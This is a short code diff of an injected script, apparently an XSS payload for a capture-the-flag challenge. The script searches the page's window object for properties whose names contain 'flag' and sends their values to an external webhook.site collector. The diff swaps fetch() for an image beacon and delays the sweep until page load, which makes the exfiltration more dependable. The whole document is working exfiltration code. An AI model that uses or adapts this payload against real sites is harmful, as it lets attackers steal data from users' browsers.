@@ -1,15 +1,19 @@
 <script>
   function send(data) {
-    fetch("https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf/?data=" + encodeURIComponent(data));
+    new Image().src = "https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf/?data=" + encodeURIComponent(data);
   }
 
-  try {
-    for (let key in window) {
-      if (key.toLowerCase().includes("flag")) {
-        send(`${key} = ${window[key]}`);
+  window.onload = function () {
+    setTimeout(() => {
+      try {
+        for (let key in window) {
+          if (key.toLowerCase().includes("flag")) {
+            send(`${key} = ${window[key]}`);
+          }
+        }
+      } catch (e) {
+        send("error=" + e.message);
       }
-    }
-  } catch (e) {
-    send("error=" + e.message);
-  }
+    }, 1000);
+  };
 </script>
